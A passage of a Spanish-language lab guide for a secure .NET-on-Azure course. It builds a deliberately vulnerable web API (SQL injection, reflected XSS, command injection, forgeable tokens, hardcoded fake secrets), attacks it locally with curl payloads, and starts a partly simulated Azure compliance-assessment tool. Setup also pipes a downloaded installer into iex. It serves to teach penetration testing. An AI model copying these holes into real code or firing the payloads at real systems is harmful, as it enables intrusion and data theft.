@@ -1,0 +1,2012 @@
+Laboratorio Práctico - Sesión 9: Pruebas de Penetración y Auditorías Avanzadas
+Curso: Diseño Seguro de Aplicaciones (.NET en Azure)
+Duración Total: 75 minutos (3 laboratorios)
+Modalidad: Instructor-led con práctica individual
+Herramientas: Visual Studio Code + .NET Core 9 + C# + Azure Portal
+________________________________________
+🛠️ LABORATORIO 0: VERIFICACIÓN Y CONFIGURACIÓN DEL ENTORNO
+⏱️ Duración: 15 minutos
+🎯 Objetivo: Preparar entorno completo para penetration testing y compliance assessment
+Paso 1: Instalación de Chocolatey (si no está instalado) (3 minutos)
+Para usuarios Windows 10/11:
+1.	Abrir PowerShell como Administrador:
+o	Click derecho en el botón de Windows
+o	Seleccionar "Windows PowerShell (Admin)" o "Terminal (Admin)"
+2.	Verificar si Chocolatey está instalado:
+choco --version
+3.	Si NO está instalado, ejecutar:
+# Cambiar política de ejecución temporalmente
+Set-ExecutionPolicy Bypass -Scope Process -Force
+
+# Instalar Chocolatey
+[System.Net.ServicePointManager]::SecurityProtocol = [System.Net.ServicePointManager]::SecurityProtocol -bor 3072
+iex ((New-Object System.Net.WebClient).DownloadString('https://community.chocolatey.org/install.ps1'))
+4.	Verificar instalación:
+choco --version
+# Debe mostrar versión de Chocolatey
+Paso 2: Instalación de .NET Core 9 y Herramientas (5 minutos)
+Instalar .NET Core 9 SDK:
+# Instalar .NET Core 9 SDK (última versión)
+choco install dotnet-9.0-sdk -y
+
+# Instalar Azure CLI
+choco install azure-cli -y
+
+# Instalar Git (si no está instalado)
+choco install git -y
+
+# Instalar herramientas adicionales de seguridad
+choco install nmap -y
+choco install postman -y
+
+# Herramientas para penetration testing
+choco install wireshark -y
+choco install burp-suite-free-edition -y
+
+# Refrescar variables de entorno
+refreshenv
+Verificar instalaciones:
+# Verificar .NET Core 9
+dotnet --version
+# Debe mostrar: 9.0.x
+
+# Verificar Azure CLI
+az --version
+
+# Verificar Git
+git --version
+
+# Verificar Nmap
+nmap --version
+Paso 3: Configuración de Visual Studio Code (4 minutos)
+Instalar VS Code (si no está instalado):
+choco install vscode -y
+Extensiones requeridas para VS Code:
+1.	Abrir VS Code y instalar extensiones: 
+o	Presionar Ctrl + Shift + X para abrir extensiones
+o	Buscar e instalar las siguientes extensiones:
+o	C# Dev Kit (Microsoft) - ID: ms-dotnettools.csdevkit
+o	Azure Account (Microsoft) - ID: ms-vscode.azure-account
+o	Azure Resources (Microsoft) - ID: ms-azuretools.vscode-azureresourcegroups
+o	Azure CLI Tools (Microsoft) - ID: ms-vscode.azurecli
+o	REST Client (Huachao Mao) - ID: humao.rest-client
+o	Azure Security Center (Microsoft) - ID: ms-azuretools.vscode-azuresecuritycenter
+Comando alternativo para instalar extensiones:
+# Desde línea de comandos
+code --install-extension ms-dotnettools.csdevkit
+code --install-extension ms-vscode.azure-account
+code --install-extension ms-azuretools.vscode-azureresourcegroups
+code --install-extension ms-vscode.azurecli
+code --install-extension humao.rest-client
+code --install-extension ms-azuretools.vscode-azuresecuritycenter
+Paso 4: Verificación de Acceso Azure (3 minutos)
+Autenticación con Azure:
+# Login a Azure
+az login
+
+# Verificar suscripciones disponibles
+az account list --output table
+
+# Verificar grupo de usuarios
+az ad group member list --group "gu_desarrollo_seguro_aplicacion" --output table
+Verificar permisos en Azure Portal:
+1.	Navegar a: https://portal.azure.com
+2.	Verificar acceso como usuario invitado
+3.	Confirmar permisos para Security Center
+________________________________________
+🔍 LABORATORIO 1: PENETRATION TESTING CON OWASP METODOLOGÍA
+⏱️ Duración: 25 minutos
+🎯 Objetivo: Implementar metodología OWASP para penetration testing sistemático
+Prerequisitos: Verificar Infraestructura Base
+Si NO completaron los laboratorios de infraestructura de sesiones anteriores, ejecutar setup básico:
+# Crear resource group base
+az group create `
+  --name rg-pentest-lab-[SuNombre] `
+  --location eastus `
+  --tags Environment=Development Project=PenTestLab
+
+# Crear VNET básica para el laboratorio
+az network vnet create `
+  --resource-group rg-pentest-lab-[SuNombre] `
+  --name vnet-pentest-lab `
+  --address-prefix 10.4.0.0/16 `
+  --subnet-name snet-web `
+  --subnet-prefix 10.4.1.0/24
+
+# Agregar subredes adicionales
+az network vnet subnet create `
+  --resource-group rg-pentest-lab-[SuNombre] `
+  --vnet-name vnet-pentest-lab `
+  --name snet-app `
+  --address-prefix 10.4.2.0/24
+
+az network vnet subnet create `
+  --resource-group rg-pentest-lab-[SuNombre] `
+  --vnet-name vnet-pentest-lab `
+  --name snet-data `
+  --address-prefix 10.4.3.0/24
+Paso 1: Crear Aplicación Web Vulnerable para Testing (10 minutos)
+Crear proyecto .NET Core con vulnerabilidades intencionales:
+# Crear directorio de proyecto
+mkdir VulnerableWebApp
+cd VulnerableWebApp
+
+# Crear proyecto .NET Core Web API
+dotnet new webapi
+
+# Agregar paquetes necesarios
+dotnet add package Microsoft.EntityFrameworkCore.InMemory
+dotnet add package Microsoft.EntityFrameworkCore.SqlServer
+dotnet add package System.Data.SqlClient
+dotnet add package Newtonsoft.Json
+Reemplazar el contenido de Program.cs:
+using Microsoft.EntityFrameworkCore;
+using System.Data.SqlClient;
+using System.Text.Json;
+
+var builder = WebApplication.CreateBuilder(args);
+
+// Add services to the container.
+builder.Services.AddControllers();
+builder.Services.AddEndpointsApiExplorer();
+builder.Services.AddSwaggerGen();
+
+// Add Entity Framework with In-Memory database for demo
+builder.Services.AddDbContext<AppDbContext>(options =>
+    options.UseInMemoryDatabase("VulnerableDB"));
+
+// Configure CORS (insecurely for demo)
+builder.Services.AddCors(options =>
+{
+    options.AddPolicy("AllowAll", policy =>
+    {
+        policy.AllowAnyOrigin()
+              .AllowAnyMethod()
+              .AllowAnyHeader();
+    });
+});
+
+var app = builder.Build();
+
+// Configure the HTTP request pipeline.
+if (app.Environment.IsDevelopment())
+{
+    app.UseSwagger();
+    app.UseSwaggerUI();
+}
+
+// ❌ VULNERABLE: Missing HTTPS redirection
+// app.UseHttpsRedirection();
+
+app.UseCors("AllowAll");
+
+app.UseAuthorization();
+
+app.MapControllers();
+
+// Seed vulnerable data
+using (var scope = app.Services.CreateScope())
+{
+    var context = scope.ServiceProvider.GetRequiredService<AppDbContext>();
+    SeedData(context);
+}
+
+app.Run();
+
+static void SeedData(AppDbContext context)
+{
+    if (!context.Users.Any())
+    {
+        context.Users.AddRange(
+            new User { Id = 1, Username = "admin", Password = "admin123", IsAdmin = true },
+            new User { Id = 2, Username = "user", Password = "password", IsAdmin = false },
+            new User { Id = 3, Username = "guest", Password = "guest", IsAdmin = false }
+        );
+        
+        context.SecretData.AddRange(
+            new SecretData { Id = 1, Title = "Database Password", Content = "SuperSecret123!" },
+            new SecretData { Id = 2, Title = "API Key", Content = "sk-1234567890abcdef" },
+            new SecretData { Id = 3, Title = "Admin Panel", Content = "/admin/secret-panel" }
+        );
+        
+        context.SaveChanges();
+    }
+}
+
+// Data Models
+public class User
+{
+    public int Id { get; set; }
+    public string Username { get; set; } = string.Empty;
+    public string Password { get; set; } = string.Empty;
+    public bool IsAdmin { get; set; }
+}
+
+public class SecretData
+{
+    public int Id { get; set; }
+    public string Title { get; set; } = string.Empty;
+    public string Content { get; set; } = string.Empty;
+}
+
+public class AppDbContext : DbContext
+{
+    public AppDbContext(DbContextOptions<AppDbContext> options) : base(options) { }
+    
+    public DbSet<User> Users { get; set; }
+    public DbSet<SecretData> SecretData { get; set; }
+}
+Crear el archivo Controllers/VulnerableController.cs:
+using Microsoft.AspNetCore.Mvc;
+using Microsoft.EntityFrameworkCore;
+using System.Data.SqlClient;
+using System.Text.Json;
+
+namespace VulnerableWebApp.Controllers;
+
+[ApiController]
+[Route("api/[controller]")]
+public class VulnerableController : ControllerBase
+{
+    private readonly AppDbContext _context;
+    private readonly ILogger<VulnerableController> _logger;
+
+    public VulnerableController(AppDbContext context, ILogger<VulnerableController> logger)
+    {
+        _context = context;
+        _logger = logger;
+    }
+
+    // ❌ VULNERABLE: SQL Injection
+    [HttpGet("user/{id}")]
+    public async Task<IActionResult> GetUser(string id)
+    {
+        try
+        {
+            // Vulnerable SQL query - directly concatenating user input
+            var users = await _context.Users
+                .FromSqlRaw($"SELECT * FROM Users WHERE Id = {id}")
+                .ToListAsync();
+
+            if (!users.Any())
+            {
+                return NotFound("User not found");
+            }
+
+            return Ok(users.First());
+        }
+        catch (Exception ex)
+        {
+            // ❌ VULNERABLE: Information disclosure in error messages
+            return BadRequest($"Database error: {ex.Message}");
+        }
+    }
+
+    // ❌ VULNERABLE: Authentication bypass and user enumeration
+    [HttpPost("login")]
+    public async Task<IActionResult> Login([FromBody] LoginRequest request)
+    {
+        if (string.IsNullOrEmpty(request.Username))
+        {
+            return BadRequest("Username is required");
+        }
+
+        // Check if user exists first (vulnerable to user enumeration)
+        var user = await _context.Users
+            .FirstOrDefaultAsync(u => u.Username == request.Username);
+
+        if (user == null)
+        {
+            return Unauthorized("User does not exist"); // ❌ Reveals user existence
+        }
+
+        // Simple password check (no hashing, timing attack vulnerable)
+        if (user.Password == request.Password)
+        {
+            // ❌ VULNERABLE: Weak session management
+            var token = GenerateSimpleToken(user);
+            return Ok(new { Token = token, IsAdmin = user.IsAdmin });
+        }
+
+        return Unauthorized("Invalid password"); // ❌ Different message reveals valid username
+    }
+
+    // ❌ VULNERABLE: XSS via unescaped output
+    [HttpGet("search")]
+    public IActionResult Search(string query)
+    {
+        if (string.IsNullOrEmpty(query))
+        {
+            return BadRequest("Query parameter is required");
+        }
+
+        // Simulate search results with reflected XSS vulnerability
+        var htmlResponse = $@"
+        <html>
+        <body>
+            <h1>Search Results</h1>
+            <p>You searched for: {query}</p>
+            <div>No results found for '{query}'</div>
+        </body>
+        </html>";
+
+        return Content(htmlResponse, "text/html");
+    }
+
+    // ❌ VULNERABLE: Broken access control
+    [HttpGet("admin/secrets")]
+    public async Task<IActionResult> GetSecrets(string token)
+    {
+        // ❌ Weak token validation
+        if (string.IsNullOrEmpty(token))
+        {
+            return Unauthorized("Token required");
+        }
+
+        // ❌ Predictable token structure
+        if (!token.StartsWith("user_") && !token.StartsWith("admin_"))
+        {
+            return Unauthorized("Invalid token format");
+        }
+
+        // ❌ No actual verification of admin status
+        if (token.StartsWith("admin_"))
+        {
+            var secrets = await _context.SecretData.ToListAsync();
+            return Ok(secrets);
+        }
+
+        return Forbid("Admin access required");
+    }
+
+    // ❌ VULNERABLE: Information disclosure
+    [HttpGet("debug/config")]
+    public IActionResult GetDebugConfig()
+    {
+        var config = new
+        {
+            DatabaseConnection = "Server=localhost;Database=Production;User=sa;Password=SuperSecret123!",
+            ApiKeys = new
+            {
+                PaymentGateway = "pk_live_1234567890",
+                EmailService = "sg.1234567890",
+                CloudStorage = "AKIA1234567890"
+            },
+            InternalUrls = new
+            {
+                AdminPanel = "https://admin.internal.company.com",
+                Database = "https://db.internal.company.com",
+                Monitoring = "https://monitor.internal.company.com"
+            }
+        };
+
+        return Ok(config);
+    }
+
+    // ❌ VULNERABLE: Command injection
+    [HttpPost("ping")]
+    public IActionResult PingHost([FromBody] PingRequest request)
+    {
+        if (string.IsNullOrEmpty(request.Host))
+        {
+            return BadRequest("Host is required");
+        }
+
+        try
+        {
+            // ❌ Direct command execution with user input
+            var process = new System.Diagnostics.Process();
+            process.StartInfo.FileName = "ping";
+            process.StartInfo.Arguments = $"-n 4 {request.Host}"; // Vulnerable to command injection
+            process.StartInfo.RedirectStandardOutput = true;
+            process.StartInfo.UseShellExecute = false;
+            
+            process.Start();
+            var output = process.StandardOutput.ReadToEnd();
+            process.WaitForExit();
+
+            return Ok(new { Output = output });
+        }
+        catch (Exception ex)
+        {
+            return BadRequest($"Ping failed: {ex.Message}");
+        }
+    }
+
+    private string GenerateSimpleToken(User user)
+    {
+        // ❌ VULNERABLE: Predictable token generation
+        var prefix = user.IsAdmin ? "admin_" : "user_";
+        var timestamp = DateTimeOffset.UtcNow.ToUnixTimeSeconds();
+        return $"{prefix}{user.Id}_{timestamp}";
+    }
+}
+
+public class LoginRequest
+{
+    public string Username { get; set; } = string.Empty;
+    public string Password { get; set; } = string.Empty;
+}
+
+public class PingRequest
+{
+    public string Host { get; set; } = string.Empty;
+}
+Compilar y ejecutar la aplicación vulnerable:
+# Compilar el proyecto
+dotnet build
+
+# Ejecutar la aplicación
+dotnet run
+La aplicación estará disponible en: https://localhost:7000 o http://localhost:5000
+Paso 2: Reconnaissance y Information Gathering (5 minutos)
+Usar Nmap para discovery:
+# Escaneo básico del localhost
+nmap -sV localhost
+
+# Escaneo de puertos específicos de desarrollo
+nmap -p 5000-7000 localhost
+
+# Detectar servicios web
+nmap -p 80,443,5000,7000 --script http-enum localhost
+Usar curl para information gathering:
+# Verificar endpoints disponibles
+curl -X GET http://localhost:5000/swagger/index.html
+
+# Probar endpoint de información sensible
+curl -X GET http://localhost:5000/api/Vulnerable/debug/config
+
+# Verificar headers de seguridad
+curl -I http://localhost:5000/api/Vulnerable/user/1
+Paso 3: Vulnerability Assessment (5 minutos)
+Testing para SQL Injection:
+# Test básico de SQL injection
+curl -X GET "http://localhost:5000/api/Vulnerable/user/1' OR '1'='1"
+
+# Test UNION-based injection
+curl -X GET "http://localhost:5000/api/Vulnerable/user/1 UNION SELECT 1,username,password,1 FROM Users--"
+
+# Test para extraer datos sensibles
+curl -X GET "http://localhost:5000/api/Vulnerable/user/999 UNION SELECT Id,Title,Content,1 FROM SecretData--"
+Testing para XSS:
+# Test reflected XSS
+curl -X GET "http://localhost:5000/api/Vulnerable/search?query=<script>alert('XSS')</script>"
+
+# Test con payload más complejo
+curl -X GET "http://localhost:5000/api/Vulnerable/search?query=<img src=x onerror=alert('Cookie: '+document.cookie)>"
+Testing para Authentication Bypass:
+# Test user enumeration
+curl -X POST http://localhost:5000/api/Vulnerable/login `
+  -H "Content-Type: application/json" `
+  -d '{"username":"admin","password":"wrong"}'
+
+curl -X POST http://localhost:5000/api/Vulnerable/login `
+  -H "Content-Type: application/json" `
+  -d '{"username":"nonexistentuser","password":"wrong"}'
+
+# Test successful login
+curl -X POST http://localhost:5000/api/Vulnerable/login `
+  -H "Content-Type: application/json" `
+  -d '{"username":"admin","password":"admin123"}'
+Paso 4: Access Control Testing (5 minutos)
+Test broken access control:
+# Test acceso sin token
+curl -X GET http://localhost:5000/api/Vulnerable/admin/secrets
+
+# Test con token de usuario normal
+curl -X GET "http://localhost:5000/api/Vulnerable/admin/secrets?token=user_2_1640995200"
+
+# Test bypass con token predictible
+curl -X GET "http://localhost:5000/api/Vulnerable/admin/secrets?token=admin_1_1640995200"
+Test command injection:
+# Test básico de ping
+curl -X POST http://localhost:5000/api/Vulnerable/ping `
+  -H "Content-Type: application/json" `
+  -d '{"host":"127.0.0.1"}'
+
+# Test command injection
+curl -X POST http://localhost:5000/api/Vulnerable/ping `
+  -H "Content-Type: application/json" `
+  -d '{"host":"127.0.0.1 && dir"}'
+
+# Test command injection más complejo
+curl -X POST http://localhost:5000/api/Vulnerable/ping `
+  -H "Content-Type: application/json" `
+  -d '{"host":"127.0.0.1; echo Vulnerable to command injection"}'
+________________________________________
+🛡️ LABORATORIO 2: COMPLIANCE FRAMEWORK ASSESSMENT
+⏱️ Duración: 25 minutos
+🎯 Objetivo: Implementar assessment basado en marcos ISO 27001 y SOC 2
+Paso 1: Crear Herramienta de Assessment Automatizado (12 minutos)
+Crear proyecto .NET para compliance assessment:
+# Crear nuevo directorio
+mkdir ComplianceAssessment
+cd ComplianceAssessment
+
+# Crear proyecto console
+dotnet new console
+
+# Agregar paquetes Azure
+dotnet add package Azure.ResourceManager
+dotnet add package Azure.ResourceManager.Resources
+dotnet add package Azure.ResourceManager.Storage
+dotnet add package Azure.ResourceManager.Compute
+dotnet add package Azure.ResourceManager.Network
+dotnet add package Azure.Identity
+dotnet add package Microsoft.Extensions.Configuration
+dotnet add package Microsoft.Extensions.Configuration.Json
+dotnet add package Newtonsoft.Json
+Reemplazar el contenido de Program.cs:
+using Azure.Identity;
+using Azure.ResourceManager;
+using Azure.ResourceManager.Resources;
+using Azure.ResourceManager.Storage;
+using Azure.ResourceManager.Compute;
+using Azure.ResourceManager.Network;
+using Microsoft.Extensions.Configuration;
+using Newtonsoft.Json;
+using System.Text;
+
+namespace ComplianceAssessment;
+
+class Program
+{
+    private static ArmClient _armClient = null!;
+    private static string _subscriptionId = string.Empty;
+    private static ComplianceReport _report = new();
+
+    static async Task Main(string[] args)
+    {
+        Console.WriteLine("🛡️  AZURE COMPLIANCE ASSESSMENT TOOL");
+        Console.WriteLine("====================================");
+        Console.WriteLine("Frameworks: ISO 27001 | SOC 2 Type II | NIST CSF");
+        Console.WriteLine();
+
+        try
+        {
+            // Initialize Azure client
+            await InitializeAzureClient();
+
+            // Run comprehensive compliance assessment
+            await RunComplianceAssessment();
+
+            // Generate executive report
+            await GenerateComplianceReport();
+
+            // Display summary
+            DisplayExecutiveSummary();
+        }
+        catch (Exception ex)
+        {
+            Console.WriteLine($"❌ Error: {ex.Message}");
+        }
+
+        Console.WriteLine("\n🎯 Assessment complete. Press any key to continue...");
+        Console.ReadKey();
+    }
+
+    static async Task InitializeAzureClient()
+    {
+        Console.WriteLine("🔐 Authenticating with Azure...");
+        
+        var credential = new DefaultAzureCredential();
+        _armClient = new ArmClient(credential);
+
+        // Get active subscription
+        var subscriptions = _armClient.GetSubscriptions();
+        await foreach (var subscription in subscriptions)
+        {
+            _subscriptionId = subscription.Data.SubscriptionId!;
+            Console.WriteLine($"📋 Analyzing subscription: {subscription.Data.DisplayName}");
+            break;
+        }
+    }
+
+    static async Task RunComplianceAssessment()
+    {
+        Console.WriteLine("\n🔍 RUNNING COMPLIANCE ASSESSMENT");
+        Console.WriteLine("================================");
+
+        // Get subscription resource
+        var subscription = await _armClient.GetSubscriptionResource(
+            new Azure.Core.ResourceIdentifier($"/subscriptions/{_subscriptionId}")).GetAsync();
+
+        await AssessIdentityAndAccessManagement(subscription.Value);
+        await AssessNetworkSecurity(subscription.Value);
+        await AssessDataProtection(subscription.Value);
+        await AssessMonitoringAndLogging(subscription.Value);
+        await AssessIncidentResponse(subscription.Value);
+    }
+
+    static async Task AssessIdentityAndAccessManagement(SubscriptionResource subscription)
+    {
+        Console.WriteLine("👤 Assessing Identity and Access Management...");
+        
+        var iamFindings = new List<ComplianceFinding>();
+
+        try
+        {
+            // Assess resource groups and RBAC assignments
+            var resourceGroups = subscription.GetResourceGroups();
+            int totalResourceGroups = 0;
+            int groupsWithCustomRoles = 0;
+
+            await foreach (var rg in resourceGroups)
+            {
+                totalResourceGroups++;
+                
+                // Simulate RBAC assessment (actual API requires specific permissions)
+                var mockRoleAssignments = new[]
+                {
+                    new { PrincipalType = "User", RoleDefinitionName = "Owner", Scope = rg.Id },
+                    new { PrincipalType = "User", RoleDefinitionName = "Contributor", Scope = rg.Id },
+                    new { PrincipalType = "ServicePrincipal", RoleDefinitionName = "Reader", Scope = rg.Id }
+                };
+
+                // Check for overprivileged assignments
+                var ownerAssignments = mockRoleAssignments.Where(r => r.RoleDefinitionName == "Owner").Count();
+                if (ownerAssignments > 2)
+                {
+                    iamFindings.Add(new ComplianceFinding
+                    {
+                        Framework = "ISO 27001",
+                        Control = "A.9.2.3 - Management of privileged access rights",
+                        Severity = "High",
+                        Resource = rg.Data.Name,
+                        Finding = $"Excessive Owner role assignments ({ownerAssignments}) detected",
+                        Recommendation = "Implement principle of least privilege and regular access reviews"
+                    });
+                }
+
+                groupsWithCustomRoles++;
+            }
+
+            // Assess MFA compliance (simulated)
+            var mfaCompliance = 85; // Simulated percentage
+            if (mfaCompliance < 95)
+            {
+                iamFindings.Add(new ComplianceFinding
+                {
+                    Framework = "SOC 2 - Security",
+                    Control = "CC6.1 - Logical access controls",
+                    Severity = "Medium",
+                    Resource = "Azure AD",
+                    Finding = $"MFA compliance at {mfaCompliance}% (target: 95%)",
+                    Recommendation = "Enforce conditional access policies requiring MFA for all users"
+                });
+            }
+
+            // Assess privileged identity management
+            iamFindings.Add(new ComplianceFinding
+            {
+                Framework = "NIST CSF - PROTECT",
+                Control = "PR.AC-4 - Access permissions are managed",
+                Severity = "Medium",
+                Resource = "Subscription",
+                Finding = "No Azure PIM (Privileged Identity Management) detected",
+                Recommendation = "Implement Azure PIM for just-in-time privileged access"
+            });
+
+            Console.WriteLine($"  ✓ Analyzed {totalResourceGroups} resource groups");
+            Console.WriteLine($"  ⚠️  Found {iamFindings.Count} IAM compliance issues");
+            
+            _report.Findings.AddRange(iamFindings);
+        }
+        catch (Exception ex)
+        {
+            Console.WriteLine($"  ❌ IAM assessment error: {ex.Message}");
+        }
+    }
+
+    static async Task AssessNetworkSecurity(SubscriptionResource subscription)
+    {
+        Console.WriteLine("🌐 Assessing Network Security...");
+        
+        var networkFindings = new List<ComplianceFinding>();
+
+        try
+        {
+            var resourceGroups = subscription.GetResourceGroups();
+            int totalNSGs = 0;
+            int insecureNSGs = 0;
+
+            await foreach (var rg in resourceGroups)
+            {
+                var nsgs = rg.GetNetworkSecurityGroups();
+                
+                await foreach (var nsg in nsgs)
+                {
+                    totalNSGs++;
+                    
+                    // Analyze NSG rules
+                    var rules = nsg.Data.SecurityRules;
+                    
+                    foreach (var rule in rules)
+                    {
+                        // Check for overly permissive rules
+                        if (rule.Access.ToString() == "Allow" && 
+                            rule.SourceAddressPrefix == "*" && 
+                            rule.DestinationPortRange?.Contains("*") == true)
+                        {
+                            insecureNSGs++;
+                            networkFindings.Add(new ComplianceFinding
+                            {
+                                Framework = "ISO 27001",
+                                Control = "A.13.1.1 - Network controls",
+                                Severity = "Critical",
+                                Resource = $"{nsg.Data.Name}/{rule.Name}",
+                                Finding = "NSG rule allows unrestricted access from any source to any port",
+                                Recommendation = "Implement principle of least privilege in network security rules"
+                            });
+                        }
+
+                        // Check for SSH/RDP exposure
+                        if (rule.Access.ToString() == "Allow" && 
+                            rule.SourceAddressPrefix == "*" && 
+                            (rule.DestinationPortRange == "22" || rule.DestinationPortRange == "3389"))
+                        {
+                            networkFindings.Add(new ComplianceFinding
+                            {
+                                Framework = "SOC 2 - Security",
+                                Control = "CC6.6 - Network controls",
+                                Severity = "High",
+                                Resource = $"{nsg.Data.Name}/{rule.Name}",
+                                Finding = $"SSH/RDP (port {rule.DestinationPortRange}) exposed to internet",
+                                Recommendation = "Restrict administrative access to specific IP ranges or VPN"
+                            });
+                        }
+                    }
+                }
+            }
+
+            Console.WriteLine($"  ✓ Analyzed {totalNSGs} Network Security Groups");
+            Console.WriteLine($"  ⚠️  Found {networkFindings.Count} network security issues");
+            
+            _report.Findings.AddRange(networkFindings);
+        }
+        catch (Exception ex)
+        {
+            Console.WriteLine($"  ❌ Network assessment error: {ex.Message}");
+        }
+    }
+
+    static async Task AssessDataProtection(SubscriptionResource subscription)
+    {
+        Console.WriteLine("🔐 Assessing Data Protection...");
+        
+        var dataFindings = new List<ComplianceFinding>();
+
+        try
+        {
+            var resourceGroups = subscription.GetResourceGroups();
+            int totalStorageAccounts = 0;
+            int unencryptedAccounts = 0;
+
+            await foreach (var rg in resourceGroups)
+            {
+                var storageAccounts = rg.GetStorageAccounts();
+                
+                await foreach (var storage in storageAccounts)
+                {
+                    totalStorageAccounts++;
+                    
+                    // Check encryption settings
+                    if (storage.Data.Encryption?.Services?.Blob?.Enabled != true)
+                    {
+                        unencryptedAccounts++;
+                        dataFindings.Add(new ComplianceFinding
+                        {
+                            Framework = "ISO 27001",
+                            Control = "A.10.1.1 - Cryptographic controls",
+                            Severity = "High",
+                            Resource = storage.Data.Name,
+                            Finding = "Storage account does not have blob encryption enabled",
+                            Recommendation = "Enable encryption at rest for all storage services"
+                        });
+                    }
+
+                    // Check public access settings
+                    if (storage.Data.AllowBlobPublicAccess == true)
+                    {
+                        dataFindings.Add(new ComplianceFinding
+                        {
+                            Framework = "SOC 2 - Confidentiality",
+                            Control = "CC6.7 - Data transmission and disposal",
+                            Severity = "Critical",
+                            Resource = storage.Data.Name,
+                            Finding = "Storage account allows public blob access",
+                            Recommendation = "Disable public blob access and use private endpoints"
+                        });
+                    }
+                }
+            }
+
+            Console.WriteLine($"  ✓ Analyzed {totalStorageAccounts} storage accounts");
+            Console.WriteLine($"  ⚠️  Found {dataFindings.Count} data protection issues");
+            
+            _report.Findings.AddRange(dataFindings);
+        }
+        catch (Exception ex)
+        {
+            Console.WriteLine($"  ❌ Data protection assessment error: {ex.Message}");
+        }
+    }
+
+    static async Task AssessMonitoringAndLogging(SubscriptionResource subscription)
+    {
+        Console.WriteLine("📊 Assessing Monitoring and Logging...");
+        
+        var monitoringFindings = new List<ComplianceFinding>();
+
+        // Simulate monitoring assessment
+        monitoringFindings.Add(new ComplianceFinding
+        {
+            Framework = "NIST CSF - DETECT",
+            Control = "DE.CM-1 - Monitor network communications",
+            Severity = "Medium",
+            Resource = "Subscription",
+            Finding = "No centralized logging solution detected",
+            Recommendation = "Implement Azure Monitor and Log Analytics workspace"
+        });
+
+        monitoringFindings.Add(new ComplianceFinding
+        {
+            Framework = "SOC 2 - Security",
+            Control = "CC7.2 - System monitoring",
+            Severity = "Medium",
+            Resource = "Subscription",
+            Finding = "Limited security alerting configured",
+            Recommendation = "Configure Azure Security Center alerts and responses"
+        });
+
+        Console.WriteLine($"  ✓ Completed monitoring assessment");
+        Console.WriteLine($"  ⚠️  Found {monitoringFindings.Count} monitoring issues");
+        
+        _report.Findings.AddRange(monitoringFindings);
+    }
+
+    static async Task AssessIncidentResponse(SubscriptionResource subscription)
+    {
+        Console.WriteLine("🚨 Assessing Incident Response...");
+        
+        var incidentFindings = new List<ComplianceFinding>();
+
+        // Simulate incident response assessment
+        incidentFindings.Add(new ComplianceFinding
+        {
+            Framework = "ISO 27001",
+            Control = "A.16.1.1 - Incident management responsibilities",
+            Severity = "High",
+            Resource = "Organization",
+            Finding = "No documented incident response plan",
+            Recommendation = "Develop and test comprehensive incident response procedures"
+        });
+
+        incidentFindings.Add(new ComplianceFinding
+        {
+            Framework = "NIST CSF - RESPOND",
+            Control = "RS.CO-2 - Events are reported",
+            Severity = "Medium",
+            Resource = "Organization",
+            Finding = "No automated incident reporting system",
+            Recommendation = "Implement Security Orchestration, Automation and Response (SOAR)"
+        });
+
+        Console.WriteLine($"  ✓ Completed incident response assessment");
+        Console.WriteLine($"  ⚠️  Found {incidentFindings.Count} incident response issues");
+        
+        _report.Findings.AddRange(incidentFindings);
+    }
+
+    static async Task GenerateComplianceReport()
+    {
+        Console.WriteLine("\n📄 GENERATING COMPLIANCE REPORT");
+        Console.WriteLine("===============================");
+
+        _report.AssessmentDate = DateTime.UtcNow;
+        _report.SubscriptionId = _subscriptionId;
+        
+        // Calculate compliance scores
+        _report.ComplianceScores = CalculateComplianceScores();
+
+        // Generate JSON report
+        var jsonReport = JsonConvert.SerializeObject(_report, Formatting.Indented);
+        await File.WriteAllTextAsync("compliance-assessment-report.json", jsonReport);
+
+        // Generate executive summary
+        var executiveSummary = GenerateExecutiveSummary();
+        await File.WriteAllTextAsync("executive-summary.md", executiveSummary);
+
+        Console.WriteLine("✅ Reports generated:");
+        Console.WriteLine("   📋 compliance-assessment-report.json");
+        Console.WriteLine("   📊 executive-summary.md");
+    }
+
+    static Dictionary<string, double> CalculateComplianceScores()
+    {
+        var scores = new Dictionary<string, double>();
+        
+        var frameworks = _report.Findings.GroupBy(f => f.Framework);
+        
+        foreach (var framework in frameworks)
+        {
+            var totalFindings = framework.Count();
+            var criticalFindings = framework.Count(f => f.Severity == "Critical");
+            var highFindings = framework.Count(f => f.Severity == "High");
+            var mediumFindings = framework.Count(f => f.Severity == "Medium");
+            
+            // Simple scoring algorithm
+            var score = Math.Max(0, 100 - (criticalFindings * 25 + highFindings * 15 + mediumFindings * 5));
+            scores[framework.Key] = score;
+        }
+        
+        return scores;
+    }
+
+    static string GenerateExecutiveSummary()
+    {
+        var sb = new StringBuilder();
+        
+        sb.AppendLine("# EXECUTIVE COMPLIANCE ASSESSMENT SUMMARY");
+        sb.AppendLine($"**Assessment Date:** {_report.AssessmentDate:yyyy-MM-dd}");
+        sb.AppendLine($"**Subscription ID:** {_report.SubscriptionId}");
+        sb.AppendLine();
+        
+        sb.AppendLine("## COMPLIANCE SCORES");
+        foreach (var score in _report.ComplianceScores)
+        {
+            var status = score.Value >= 80 ? "✅ COMPLIANT" : 
+                        score.Value >= 60 ? "⚠️ PARTIALLY COMPLIANT" : "❌ NON-COMPLIANT";
+            sb.AppendLine($"- **{score.Key}:** {score.Value:F1}% {status}");
+        }
+        sb.AppendLine();
+        
+        sb.AppendLine("## CRITICAL FINDINGS");
+        var criticalFindings = _report.Findings.Where(f => f.Severity == "Critical").ToList();
+        if (criticalFindings.Any())
+        {
+            foreach (var finding in criticalFindings)
+            {
+                sb.AppendLine($"### {finding.Framework} - {finding.Control}");
+                sb.AppendLine($"**Resource:** {finding.Resource}");
+                sb.AppendLine($"**Finding:** {finding.Finding}");
+                sb.AppendLine($"**Recommendation:** {finding.Recommendation}");
+                sb.AppendLine();
+            }
+        }
+        else
+        {
+            sb.AppendLine("✅ No critical findings identified.");
+            sb.AppendLine();
+        }
+        
+        sb.AppendLine("## REMEDIATION PRIORITIES");
+        sb.AppendLine("1. **Immediate (0-30 days):** Address all Critical severity findings");
+        sb.AppendLine("2. **Short-term (30-90 days):** Resolve High severity findings");
+        sb.AppendLine("3. **Medium-term (90-180 days):** Address Medium severity findings");
+        sb.AppendLine();
+        
+        return sb.ToString();
+    }
+
+    static void DisplayExecutiveSummary()
+    {
+        Console.WriteLine("\n🎯 EXECUTIVE SUMMARY");
+        Console.WriteLine("===================");
+        
+        var totalFindings = _report.Findings.Count;
+        var criticalCount = _report.Findings.Count(f => f.Severity == "Critical");
+        var highCount = _report.Findings.Count(f => f.Severity == "High");
